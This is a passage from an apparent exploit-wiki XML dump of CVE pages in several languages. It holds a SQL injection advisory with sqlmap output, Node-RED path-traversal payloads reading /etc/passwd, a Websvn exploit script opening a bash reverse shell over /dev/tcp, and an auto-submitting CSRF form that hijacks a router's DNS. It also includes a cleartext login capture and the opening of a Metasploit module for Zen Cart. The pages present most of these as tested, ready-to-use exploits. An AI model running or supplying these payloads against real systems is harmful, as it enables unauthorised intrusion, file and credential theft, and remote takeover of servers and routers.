CHR(113)||CHR(112)||CHR(113)||CHR(120)||CHR(113),NULL FROM DUAL-- LShX

Result:
====
back-end DBMS: Oracle
banner: 'Oracle Database 19c Standard Edition 2 Release 19.0.0.0.0 - Production'
current user: 'IPA_ADMIN'
current database (equivalent to schema on Oracle): 'IPA_ADMIN'
current user is DBA: False
database management system users [18]:
====


Impact:
Complete compromise of the database's data integrity.

Discovery:
1. Discovered manually
2. Exploited via sqlmap
------------------------------------------
[Vulnerability Type]
SQL Injection
------------------------------------------
[Vendor of Product]
Hexagon AG
------------------------------------------
[Affected Product Code Base]
G!nius Auskunftsportal - 5.0.0.0 (fixed)
------------------------------------------
[Affected Component]
DownloadPublicFile component
------------------------------------------
[Attack Type]
Remote
------------------------------------------
[Impact Information Disclosure]
true
------------------------------------------
[Attack Vectors]
The web application has a function ("DownloadPublicFile") which facilitates downloads.
The "id" parameter (used to specify which file is to be downloaded) is vulnerable to SQL injection.
This SQL injection attack surface allows the Oracle database backend to be accessed and read without authentication by using a "UNION SELECT" payload.
Accessing the following URL will trigger an Oracle error message:
https://[affected site root]/GiPWorkflow/Service/DownloadPublicFile?id=DS'
The apostrophe at the end (Unicode U+0027) interrupts the application's hard-coded SQL query.
At this point a "UNION SELECT" payload can be used to access any data within the database.
------------------------------------------
[Has vendor confirmed or acknowledged the vulnerability?]
true
A patch has been developed, released and installed to all known instances of the vulnerability a full six months prior to public disclosure.
------------------------------------------
[Discoverer]
Marcel Keiffenheim
------------------------------------------
[Reference]
https://www.hexagonsafetyinfrastructure.com/products/utilities-and-communications-products/advanced-utility-gis/hexagon-ginius
&lt;/pre&gt;</text>
      <sha1>cngn5ku38i6pnvghg7rto4kfhgw5a0x</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3223 Node-RED ui base 任意文件讀取漏洞</title>
    <ns>0</ns>
    <id>5440</id>
    <revision>
      <id>6251</id>
      <timestamp>2021-07-04T09:19:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt;   &lt;center&gt; {| style="border: 2.0px solid grey; background: #b3ff9c;" width="85%" | align="center" width="60px"| [[File:Check.png|link=|55px]] | align="center" |'..."</comment>
      <origin>6251</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="677" sha1="d5rbfwrfl0lxd0t92b50khhcb9yi2rx" xml:space="preserve">&lt;languages /&gt;


&lt;center&gt;
{| style="border: 2.0px solid grey; background: #b3ff9c;" width="85%"
| align="center" width="60px"| [[File:Check.png|link=|55px]]
| align="center" |'''&lt;translate&gt;該漏洞已通過驗證&lt;/translate&gt;'''
------
&lt;small&gt;&lt;translate&gt;本頁面的EXP/POC/Payload經測試可用，漏洞已經成功復現。&lt;/translate&gt;&lt;/small&gt;
|}
&lt;/center&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
Node-RED

==FOFA==
&lt;pre&gt;
title="Node-RED"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
/ui_base/js/..%2f..%2f..%2f..%2fsettings.js
&lt;/pre&gt;

&lt;translate&gt;
==參考==
&lt;/translate&gt;
https://mp.weixin.qq.com/s/KRGKXAJQawXl88RBPTaAeg</text>
      <sha1>d5rbfwrfl0lxd0t92b50khhcb9yi2rx</sha1>
    </revision>
    <revision>
      <id>6252</id>
      <parentid>6251</parentid>
      <timestamp>2021-07-04T09:20:01Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6252</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="721" sha1="ng0ckjik73912mztqhvj32kasgzp32b" xml:space="preserve">&lt;languages /&gt;


&lt;center&gt;
{| style="border: 2.0px solid grey; background: #b3ff9c;" width="85%"
| align="center" width="60px"| [[File:Check.png|link=|55px]]
| align="center" |'''&lt;translate&gt;&lt;!--T:1--&gt; 該漏洞已通過驗證&lt;/translate&gt;'''
------
&lt;small&gt;&lt;translate&gt;&lt;!--T:2--&gt; 本頁面的EXP/POC/Payload經測試可用，漏洞已經成功復現。&lt;/translate&gt;&lt;/small&gt;
|}
&lt;/center&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:3--&gt;
&lt;/translate&gt;
Node-RED

==FOFA==
&lt;pre&gt;
title="Node-RED"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
/ui_base/js/..%2f..%2f..%2f..%2fsettings.js
&lt;/pre&gt;

&lt;translate&gt;
==參考== &lt;!--T:4--&gt;
&lt;/translate&gt;
https://mp.weixin.qq.com/s/KRGKXAJQawXl88RBPTaAeg</text>
      <sha1>ng0ckjik73912mztqhvj32kasgzp32b</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3223 Node-RED ui base 任意文件讀取漏洞/en</title>
    <ns>0</ns>
    <id>5457</id>
    <revision>
      <id>6269</id>
      <timestamp>2021-07-04T09:24:23Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "The EXP/POC/Payload on this page has been tested and available, and the vulnerability has been successfully reproduced."</comment>
      <origin>6269</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="650" sha1="9mshbyafqlmrp7c5y5h3fqexccm0htr" xml:space="preserve">&lt;languages /&gt;


&lt;center&gt;
{| style="border: 2.0px solid grey; background: #b3ff9c;" width="85%"
| align="center" width="60px"| [[File:Check.png|link=|55px]]
| align="center" |'''The vulnerability has been verified'''
------
&lt;small&gt;The EXP/POC/Payload on this page has been tested and available, and the vulnerability has been successfully reproduced.&lt;/small&gt;
|}
&lt;/center&gt;
==Vulnerability Impact==
Node-RED

==FOFA==
&lt;pre&gt;
title="Node-RED"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
/ui_base/js/..%2f..%2f..%2f..%2fsettings.js
&lt;/pre&gt;

==Reference==
https://mp.weixin.qq.com/s/KRGKXAJQawXl88RBPTaAeg</text>
      <sha1>9mshbyafqlmrp7c5y5h3fqexccm0htr</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3223 Node-RED ui base 任意文件讀取漏洞/zh-cn</title>
    <ns>0</ns>
    <id>5446</id>
    <revision>
      <id>6258</id>
      <timestamp>2021-07-04T09:21:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-3223 Node-RED ui base 任意文件读取漏洞"</comment>
      <origin>6258</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="581" sha1="cub5e9i4w719yp9dfs0jer8dy793stx" xml:space="preserve">&lt;languages /&gt;


&lt;center&gt;
{| style="border: 2.0px solid grey; background: #b3ff9c;" width="85%"
| align="center" width="60px"| [[File:Check.png|link=|55px]]
| align="center" |'''该漏洞已通过验证'''
------
&lt;small&gt;本页面的EXP/POC/Payload经测试可用，漏洞已经成功复现。&lt;/small&gt;
|}
&lt;/center&gt;
==漏洞影响==
Node-RED

==FOFA==
&lt;pre&gt;
title="Node-RED"
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/ui_base/js/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
/ui_base/js/..%2f..%2f..%2f..%2fsettings.js
&lt;/pre&gt;

==参考==
https://mp.weixin.qq.com/s/KRGKXAJQawXl88RBPTaAeg</text>
      <sha1>cub5e9i4w719yp9dfs0jer8dy793stx</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32305 Websvn 2.6.0 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>4772</id>
    <revision>
      <id>5496</id>
      <timestamp>2021-06-21T13:50:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; Version: 2.6.0  ==EXP== &lt;pre&gt; # Exploit Title: Websvn 2.6.0 - Remote Code Execution (Unauthenticated) # Date: 20/06/202..."</comment>
      <origin>5496</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1096" sha1="jvo97uv2ptmd5sa72ft6kbtqimej5ch" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
Version: 2.6.0

==EXP==
&lt;pre&gt;
# Exploit Title: Websvn 2.6.0 - Remote Code Execution (Unauthenticated)
# Date: 20/06/2021
# Exploit Author: g0ldm45k
# Vendor Homepage: https://websvnphp.github.io/
# Software Link: https://github.com/websvnphp/websvn/releases/tag/2.6.0
# Version: 2.6.0
# Tested on: Docker + Debian GNU/Linux (Buster)
# CVE : CVE-2021-32305

import requests
import argparse
from urllib.parse import quote_plus

PAYLOAD = "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.149/4444 0&gt;&amp;1'"
REQUEST_PAYLOAD = '/search.php?search=";{};"'

parser = argparse.ArgumentParser(description='Send a payload to a websvn 2.6.0 server.')
parser.add_argument('target', type=str, help="Target URL.")

args = parser.parse_args()

if args.target.startswith("http://") or args.target.startswith("https://"):
    target = args.target
else:
    print("[!] Target should start with either http:// or https://")
    exit()

requests.get(target + REQUEST_PAYLOAD.format(quote_plus(PAYLOAD)))

print("[*] Request send. Did you get what you wanted?")
&lt;/pre&gt;</text>
      <sha1>jvo97uv2ptmd5sa72ft6kbtqimej5ch</sha1>
    </revision>
    <revision>
      <id>5497</id>
      <parentid>5496</parentid>
      <timestamp>2021-06-21T13:51:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>5497</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1107" sha1="b6f3nwtxcj7l5s6bfsh3kr32hi8kww7" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: 2.6.0

==EXP==
&lt;pre&gt;
# Exploit Title: Websvn 2.6.0 - Remote Code Execution (Unauthenticated)
# Date: 20/06/2021
# Exploit Author: g0ldm45k
# Vendor Homepage: https://websvnphp.github.io/
# Software Link: https://github.com/websvnphp/websvn/releases/tag/2.6.0
# Version: 2.6.0
# Tested on: Docker + Debian GNU/Linux (Buster)
# CVE : CVE-2021-32305

import requests
import argparse
from urllib.parse import quote_plus

PAYLOAD = "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.149/4444 0&gt;&amp;1'"
REQUEST_PAYLOAD = '/search.php?search=";{};"'

parser = argparse.ArgumentParser(description='Send a payload to a websvn 2.6.0 server.')
parser.add_argument('target', type=str, help="Target URL.")

args = parser.parse_args()

if args.target.startswith("http://") or args.target.startswith("https://"):
    target = args.target
else:
    print("[!] Target should start with either http:// or https://")
    exit()

requests.get(target + REQUEST_PAYLOAD.format(quote_plus(PAYLOAD)))

print("[*] Request send. Did you get what you wanted?")
&lt;/pre&gt;</text>
      <sha1>b6f3nwtxcj7l5s6bfsh3kr32hi8kww7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32305 Websvn 2.6.0 遠程代碼執行漏洞/en</title>
    <ns>0</ns>
    <id>4923</id>
    <revision>
      <id>5663</id>
      <timestamp>2021-06-24T01:55:13Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2021-32305 Websvn 2.6.0 remote code execution vulnerability"</comment>
      <origin>5663</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1079" sha1="42hr8b00morcevsa4pg2pv1edend4ol" xml:space="preserve">&lt;languages /&gt;
==Vulnerability Impact==
Version: 2.6.0

==EXP==
&lt;pre&gt;
# Exploit Title: Websvn 2.6.0 - Remote Code Execution (Unauthenticated)
# Date: 20/06/2021
# Exploit Author: g0ldm45k
# Vendor Homepage: https://websvnphp.github.io/
# Software Link: https://github.com/websvnphp/websvn/releases/tag/2.6.0
# Version: 2.6.0
# Tested on: Docker + Debian GNU/Linux (Buster)
# CVE : CVE-2021-32305

import requests
import argparse
from urllib.parse import quote_plus

PAYLOAD = "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.149/4444 0&gt;&amp;1'"
REQUEST_PAYLOAD = '/search.php?search=";{};"'

parser = argparse.ArgumentParser(description='Send a payload to a websvn 2.6.0 server.')
parser.add_argument('target', type=str, help="Target URL.")

args = parser.parse_args()

if args.target.startswith("http://") or args.target.startswith("https://"):
    target = args.target
else:
    print("[!] Target should start with either http:// or https://")
    exit()

requests.get(target + REQUEST_PAYLOAD.format(quote_plus(PAYLOAD)))

print("[*] Request send. Did you get what you wanted?")
&lt;/pre&gt;</text>
      <sha1>42hr8b00morcevsa4pg2pv1edend4ol</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32305 Websvn 2.6.0 遠程代碼執行漏洞/zh-tw</title>
    <ns>0</ns>
    <id>5110</id>
    <revision>
      <id>5850</id>
      <timestamp>2021-06-24T03:15:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==漏洞影響=="</comment>
      <origin>5850</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1071" sha1="timhm8bsc1v100aliwph083ytxasdpo" xml:space="preserve">&lt;languages /&gt;
==漏洞影響==
Version: 2.6.0

==EXP==
&lt;pre&gt;
# Exploit Title: Websvn 2.6.0 - Remote Code Execution (Unauthenticated)
# Date: 20/06/2021
# Exploit Author: g0ldm45k
# Vendor Homepage: https://websvnphp.github.io/
# Software Link: https://github.com/websvnphp/websvn/releases/tag/2.6.0
# Version: 2.6.0
# Tested on: Docker + Debian GNU/Linux (Buster)
# CVE : CVE-2021-32305

import requests
import argparse
from urllib.parse import quote_plus

PAYLOAD = "/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.149/4444 0&gt;&amp;1'"
REQUEST_PAYLOAD = '/search.php?search=";{};"'

parser = argparse.ArgumentParser(description='Send a payload to a websvn 2.6.0 server.')
parser.add_argument('target', type=str, help="Target URL.")

args = parser.parse_args()

if args.target.startswith("http://") or args.target.startswith("https://"):
    target = args.target
else:
    print("[!] Target should start with either http:// or https://")
    exit()

requests.get(target + REQUEST_PAYLOAD.format(quote_plus(PAYLOAD)))

print("[*] Request send. Did you get what you wanted?")
&lt;/pre&gt;</text>
      <sha1>timhm8bsc1v100aliwph083ytxasdpo</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32403 Intelbras Router RF 301K - 'DNS Hijacking' CSRF 漏洞</title>
    <ns>0</ns>
    <id>3868</id>
    <revision>
      <id>4479</id>
      <timestamp>2021-06-09T13:45:55Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; Version: Firmware 1.1.2-1.1.5  ==EXP== &lt;pre&gt; # Exploit Title: Intelbras Router RF 301K - 'DNS Hijacking' Cross-Site Req..."</comment>
      <origin>4479</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="985" sha1="tbvokcfxb8yh8masfuu4bol6rkb7tha" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
Version: Firmware 1.1.2-1.1.5

==EXP==
&lt;pre&gt;
# Exploit Title: Intelbras Router RF 301K - 'DNS Hijacking' Cross-Site Request Forgery (CSRF)
# Date: 01/05/2021
# Exploit Author: Rodolfo Mariano
# Version: Firmware 1.1.2-1.1.5
# CVE: 2021-32403

# Exploit Code: 
&lt;html&gt;
    &lt;form action="http://10.0.0.1/goform/setSysTools" method="POST"&gt;
        &lt;input name="module3" value="lanCfg" type="hidden"&gt;
        &lt;input name="lanIP" value="10.0.0.1" type="hidden"&gt;
        &lt;input name="lanMask" value="255.255.255.0" type="hidden"&gt;
        &lt;input name="dhcpEn" value="true" type="hidden"&gt;
        &lt;input name="lanDhcpStartIP" value="10.0.0.100" type="hidden"&gt;
        &lt;input name="lanDhcpEndIP" value="10.0.0.200" type="hidden"&gt;
        &lt;input name="lanDns1" value="192.168.0.30" type="hidden"&gt;
        &lt;input name="lanDns2" value="" type="hidden"&gt;
    &lt;/form&gt;
    &lt;script&gt;
        document.forms[0].submit();
    &lt;/script&gt;
&lt;/html&gt;
&lt;/pre&gt;</text>
      <sha1>tbvokcfxb8yh8masfuu4bol6rkb7tha</sha1>
    </revision>
    <revision>
      <id>4480</id>
      <parentid>4479</parentid>
      <timestamp>2021-06-09T13:46:22Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4480</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="996" sha1="pdglf4atb18w0cfemymx6yhomr6h2lm" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: Firmware 1.1.2-1.1.5

==EXP==
&lt;pre&gt;
# Exploit Title: Intelbras Router RF 301K - 'DNS Hijacking' Cross-Site Request Forgery (CSRF)
# Date: 01/05/2021
# Exploit Author: Rodolfo Mariano
# Version: Firmware 1.1.2-1.1.5
# CVE: 2021-32403

# Exploit Code: 
&lt;html&gt;
    &lt;form action="http://10.0.0.1/goform/setSysTools" method="POST"&gt;
        &lt;input name="module3" value="lanCfg" type="hidden"&gt;
        &lt;input name="lanIP" value="10.0.0.1" type="hidden"&gt;
        &lt;input name="lanMask" value="255.255.255.0" type="hidden"&gt;
        &lt;input name="dhcpEn" value="true" type="hidden"&gt;
        &lt;input name="lanDhcpStartIP" value="10.0.0.100" type="hidden"&gt;
        &lt;input name="lanDhcpEndIP" value="10.0.0.200" type="hidden"&gt;
        &lt;input name="lanDns1" value="192.168.0.30" type="hidden"&gt;
        &lt;input name="lanDns2" value="" type="hidden"&gt;
    &lt;/form&gt;
    &lt;script&gt;
        document.forms[0].submit();
    &lt;/script&gt;
&lt;/html&gt;
&lt;/pre&gt;</text>
      <sha1>pdglf4atb18w0cfemymx6yhomr6h2lm</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32403 Intelbras Router RF 301K - 'DNS Hijacking' CSRF 漏洞/pt</title>
    <ns>0</ns>
    <id>4085</id>
    <revision>
      <id>4702</id>
      <timestamp>2021-06-10T03:48:52Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== Versão afetada =="</comment>
      <origin>4702</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="965" sha1="mneuxpmi6az4ykxxkq32bh5ah9r3trb" xml:space="preserve">&lt;languages /&gt;
== Versão afetada ==
Version: Firmware 1.1.2-1.1.5

==EXP==
&lt;pre&gt;
# Exploit Title: Intelbras Router RF 301K - 'DNS Hijacking' Cross-Site Request Forgery (CSRF)
# Date: 01/05/2021
# Exploit Author: Rodolfo Mariano
# Version: Firmware 1.1.2-1.1.5
# CVE: 2021-32403

# Exploit Code: 
&lt;html&gt;
    &lt;form action="http://10.0.0.1/goform/setSysTools" method="POST"&gt;
        &lt;input name="module3" value="lanCfg" type="hidden"&gt;
        &lt;input name="lanIP" value="10.0.0.1" type="hidden"&gt;
        &lt;input name="lanMask" value="255.255.255.0" type="hidden"&gt;
        &lt;input name="dhcpEn" value="true" type="hidden"&gt;
        &lt;input name="lanDhcpStartIP" value="10.0.0.100" type="hidden"&gt;
        &lt;input name="lanDhcpEndIP" value="10.0.0.200" type="hidden"&gt;
        &lt;input name="lanDns1" value="192.168.0.30" type="hidden"&gt;
        &lt;input name="lanDns2" value="" type="hidden"&gt;
    &lt;/form&gt;
    &lt;script&gt;
        document.forms[0].submit();
    &lt;/script&gt;
&lt;/html&gt;
&lt;/pre&gt;</text>
      <sha1>mneuxpmi6az4ykxxkq32bh5ah9r3trb</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-32612 VeryFitPro 3.2.8 加密問題漏洞</title>
    <ns>0</ns>
    <id>5427</id>
    <revision>
      <id>6228</id>
      <timestamp>2021-07-03T06:41:36Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞簡介== &lt;/translate&gt; &lt;translate&gt; VeryFitPro是中國深圳市愛都科技有限公司的一款功能強大的健康管理軟件,需要搭配..."</comment>
      <origin>6228</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2740" sha1="12lwjvbxdkzdhh92a9zhljarjzoengk" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞簡介==
&lt;/translate&gt;
&lt;translate&gt;
VeryFitPro是中國深圳市愛都科技有限公司的一款功能強大的健康管理軟件,需要搭配同品牌智能手環使用,使用app用戶可以實時查看行走步數、消耗卡里路、睡眠質量等信息。


VeryFitPro 中存在加密問題漏洞，該漏洞源於允許通過明文HTTP與後端API進行所有通信。攻擊者可通過該漏洞獲得用戶敏感信息。以下產品及版本受到影響：VeryFitPro For Android 3.2.8。
&lt;/translate&gt;

==POC==
&lt;pre&gt;
Proof of concept
################
 
 
This is the TCP packet with the login request including password hash and username in cleartext:
 
 
$ host veryfitproapi.veryfitplus.com
veryfitproapi.veryfitplus.com has address 47.254.154.79
 
 
REQUEST:
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
12:07:13.267203 IP Kali.36786 &gt; 47.254.154.79.http: Flags [P.], seq 1:304, ack 1, win 502, options [nop,nop,TS val 3095874488 ecr 477042156], length 303: HTTP: POST /user/login HTTP/1.1
  0x0000:  4500 0163 6cb7 4000 4006 416b c0a8 007d  E..cl.@.@.Ak...}
  0x0010:  2ffe 9a4f 8fb2 0050 196c 8bba 4fc9 359b  /..O...P.l..O.5.
  0x0020:  8018 01f6 8cc8 0000 0101 080a b887 4bb8  ..............K.
  0x0030:  1c6f 15ec 504f 5354 202f 7573 6572 2f6c  .o..POST./user/l
  0x0040:  6f67 696e 2048 5454 502f 312e 310d 0a43  ogin.HTTP/1.1..C
  0x0050:  6f6e 7465 6e74 2d54 7970 653a 2061 7070  ontent-Type:.app
  0x0060:  6c69 6361 7469 6f6e 2f78 2d77 7777 2d66  lication/x-www-f
  0x0070:  6f72 6d2d 7572 6c65 6e63 6f64 6564 0d0a  orm-urlencoded..
  0x0080:  436f 6e74 656e 742d 4c65 6e67 7468 3a20  Content-Length:.
  0x0090:  3931 0d0a 486f 7374 3a20 7665 7279 6669  91..Host:.veryfi
  0x00a0:  7470 726f 6170 692e 7665 7279 6669 7470  tproapi.veryfitp
  0x00b0:  6c75 732e 636f 6d0d 0a43 6f6e 6e65 6374  lus.com..Connect
  0x00c0:  696f 6e3a 2063 6c6f 7365 0d0a 4163 6365  ion:.close..Acce
  0x00d0:  7074 2d45 6e63 6f64 696e 673a 2067 7a69  pt-Encoding:.gzi
  0x00e0:  702c 2064 6566 6c61 7465 0d0a 5573 6572  p,.deflate..User
  0x00f0:  2d41 6765 6e74 3a20 6f6b 6874 7470 2f33  -Agent:.okhttp/3
  0x0100:  2e38 2e30 0d0a 0d0a 6172 6561 3d45 7572  .8.0....area=Eur
  0x0110:  6f70 6526 7061 7373 776f 7264 3d64 3831  ope&amp;password=d81
  0x0120:  3962 3832 3536 3665 3962 3630 3164 3837  9b82566e9b601d87
  0x0130:  6531 3638 6430 6466 6665 3331 6365 6531  e168d0dffe31cee1
  0x0140:  6139 3232 3926 6163 636f 756e 743d 6e2e  a9229&amp;account=n.
  0x0150:  6465 636b 6572 2534 3074 726f 7665 6e74  decker%40trovent
  0x0160:  2e69 6f                                  .io
 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/pre&gt;</text>
      <sha1>12lwjvbxdkzdhh92a9zhljarjzoengk</sha1>
    </revision>
    <revision>
      <id>6229</id>
      <parentid>6228</parentid>
      <timestamp>2021-07-03T06:42:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6229</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2773" sha1="8g36kiqipemrlbo1iykq7n1laks8duq" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞簡介== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;translate&gt;
&lt;!--T:2--&gt;
VeryFitPro是中國深圳市愛都科技有限公司的一款功能強大的健康管理軟件,需要搭配同品牌智能手環使用,使用app用戶可以實時查看行走步數、消耗卡里路、睡眠質量等信息。


&lt;!--T:3--&gt;
VeryFitPro 中存在加密問題漏洞，該漏洞源於允許通過明文HTTP與後端API進行所有通信。攻擊者可通過該漏洞獲得用戶敏感信息。以下產品及版本受到影響：VeryFitPro For Android 3.2.8。
&lt;/translate&gt;

==POC==
&lt;pre&gt;
Proof of concept
################
 
 
This is the TCP packet with the login request including password hash and username in cleartext:
 
 
$ host veryfitproapi.veryfitplus.com
veryfitproapi.veryfitplus.com has address 47.254.154.79
 
 
REQUEST:
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 
12:07:13.267203 IP Kali.36786 &gt; 47.254.154.79.http: Flags [P.], seq 1:304, ack 1, win 502, options [nop,nop,TS val 3095874488 ecr 477042156], length 303: HTTP: POST /user/login HTTP/1.1
  0x0000:  4500 0163 6cb7 4000 4006 416b c0a8 007d  E..cl.@.@.Ak...}
  0x0010:  2ffe 9a4f 8fb2 0050 196c 8bba 4fc9 359b  /..O...P.l..O.5.
  0x0020:  8018 01f6 8cc8 0000 0101 080a b887 4bb8  ..............K.
  0x0030:  1c6f 15ec 504f 5354 202f 7573 6572 2f6c  .o..POST./user/l
  0x0040:  6f67 696e 2048 5454 502f 312e 310d 0a43  ogin.HTTP/1.1..C
  0x0050:  6f6e 7465 6e74 2d54 7970 653a 2061 7070  ontent-Type:.app
  0x0060:  6c69 6361 7469 6f6e 2f78 2d77 7777 2d66  lication/x-www-f
  0x0070:  6f72 6d2d 7572 6c65 6e63 6f64 6564 0d0a  orm-urlencoded..
  0x0080:  436f 6e74 656e 742d 4c65 6e67 7468 3a20  Content-Length:.
  0x0090:  3931 0d0a 486f 7374 3a20 7665 7279 6669  91..Host:.veryfi
  0x00a0:  7470 726f 6170 692e 7665 7279 6669 7470  tproapi.veryfitp
  0x00b0:  6c75 732e 636f 6d0d 0a43 6f6e 6e65 6374  lus.com..Connect
  0x00c0:  696f 6e3a 2063 6c6f 7365 0d0a 4163 6365  ion:.close..Acce
  0x00d0:  7074 2d45 6e63 6f64 696e 673a 2067 7a69  pt-Encoding:.gzi
  0x00e0:  702c 2064 6566 6c61 7465 0d0a 5573 6572  p,.deflate..User
  0x00f0:  2d41 6765 6e74 3a20 6f6b 6874 7470 2f33  -Agent:.okhttp/3
  0x0100:  2e38 2e30 0d0a 0d0a 6172 6561 3d45 7572  .8.0....area=Eur
  0x0110:  6f70 6526 7061 7373 776f 7264 3d64 3831  ope&amp;password=d81
  0x0120:  3962 3832 3536 3665 3962 3630 3164 3837  9b82566e9b601d87
  0x0130:  6531 3638 6430 6466 6665 3331 6365 6531  e168d0dffe31cee1
  0x0140:  6139 3232 3926 6163 636f 756e 743d 6e2e  a9229&amp;account=n.
  0x0150:  6465 636b 6572 2534 3074 726f 7665 6e74  decker%40trovent
  0x0160:  2e69 6f                                  .io
 
 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
&lt;/pre&gt;</text>
      <sha1>8g36kiqipemrlbo1iykq7n1laks8duq</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-3291 Zen Cart 1.5.7b 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>982</id>
    <revision>
      <id>1256</id>
      <timestamp>2021-04-08T09:16:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  ### # # # This exploit..."</comment>
      <origin>1256</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="7549" sha1="g0viauj9mpw9j05o5sga3d13o9e0e67" xml:space="preserve">==EXP==
&lt;pre&gt;
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
#
# This exploit  write payload in database and trig to command
# a bug in an zencart v1.5.7b web application
#
###
class MetasploitModule &lt; Msf::Exploit::Remote
    Rank = NormalRanking
  
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HttpServer
  
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name'           =&gt; 'zencart authenticated remote code execution exploit',
          'Description'    =&gt; %q(
              This exploit module execution os command in zencart.
          ),
